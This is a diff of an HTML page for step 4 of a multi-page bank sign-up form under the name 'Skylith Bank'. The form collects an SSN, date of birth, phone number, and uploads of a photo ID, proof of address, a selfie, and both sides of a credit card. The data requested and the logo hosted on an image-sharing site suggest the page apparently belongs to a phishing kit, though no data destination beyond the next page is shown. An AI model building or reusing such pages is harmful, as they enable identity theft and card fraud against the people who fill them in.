@@ -1,35 +1,77 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify Your Identity - SSN</title>
-  <link rel="stylesheet" href="css/styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Your Bank Account - Step 4</title>
+    <link rel="stylesheet" href="css/styles.css">
 </head>
 <body>
-  <div class="container">
-    <div class="banner">
-      <img src="https://i.postimg.cc/3rqWgGsg/logo.webp" alt="Skylith Bank">
+    <div class="container">
+        <header>
+            <h1>Create Your Bank Account</h1>
+        </header>
+        <main>
+            <div class="section">
+                <h2>Verify Your Identity</h2>
+                <p>We're required by law to collect your Social Security Number / TIN.</p>
+                <form action="page5.html" method="POST" enctype="multipart/form-data">
+                    <!-- SSN -->
+                    <div class="form-group">
+                        <label for="ssn">Social Security Number (SSN):</label>
+                        <input type="text" id="ssn" name="ssn" required>
+                    </div>
+                    <!-- Confirm SSN -->
+                    <div class="form-group">
+                        <label for="confirmSSN">Confirm SSN / TIN:</label>
+                        <input type="text" id="confirmSSN" name="confirmSSN" required>
+                    </div>
+                    <!-- Government-Issued Photo ID -->
+                    <div class="form-group">
+                        <label for="idType">Government-Issued Photo ID:</label>
+                        <select id="idType" name="idType" required>
+                            <option value="passport">Passport</option>
+                            <option value="driversLicense">Driver’s License</option>
+                            <option value="nationalID">National ID card</option>
+                        </select>
+                        <input type="file" name="idPhoto" required>
+                    </div>
+                    <!-- Proof of Address -->
+                    <div class="form-group">
+                        <label for="proofOfAddress">Proof of Address:</label>
+                        <select id="proofOfAddress" name="proofOfAddress" required>
+                            <option value="utilityBill">Utility Bill</option>
+                            <option value="leaseAgreement">Lease Agreement</option>
+                            <option value="bankStatement">Bank Statement</option>
+                        </select>
+                        <input type="file" name="proofOfAddressPhoto" required>
+                    </div>
+                    <!-- Other fields: DOB, Phone, Photo, Credit Card -->
+                    <div class="form-group">
+                        <label for="dob">Date of Birth:</label>
+                        <input type="date" id="dob" name="dob" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">Phone Number for Multi-Factor Authentication:</label>
+                        <input type="tel" id="phone" name="phone" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="selfie">Take a selfie:</label>
+                        <input type="file" name="selfie" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="creditCard">Credit Card:</label>
+                        <input type="file" name="creditCardFront" required>
+                        <input type="file" name="creditCardBack" required>
+                    </div>
+                    <div class="buttons">
+                        <a href="page3.html" class="previous">Previous</a>
+                        <button type="submit" class="next">Next</button>
+                    </div>
+                </form>
+            </div>
+        </main>
     </div>
-    <h1>Verify Your Identity</h1>
-    <p>We're required by law to collect your Social Security Number / TIN.</p>
-
-    <form id="ssnForm">
-      <label for="ssn">Social Security Number / TIN:</label>
-      <input type="text" id="ssn" name="ssn" required>
-
-      <label for="confirmSSN">Confirm SSN / TIN:</label>
-      <input type="text" id="confirmSSN" name="confirmSSN" required>
-
-      <label for="dob">Date of Birth:</label>
-      <input type="date" id="dob" name="dob" required>
-
-      <div class="button-group">
-        <button type="button" id="prevPage">Previous</button>
-        <button type="button" id="nextPage">Next</button>
-      </div>
-    </form>
-  </div>
-  <script src="js/script.js"></script>
+    <script src="js/script.js"></script>
 </body>
 </html>
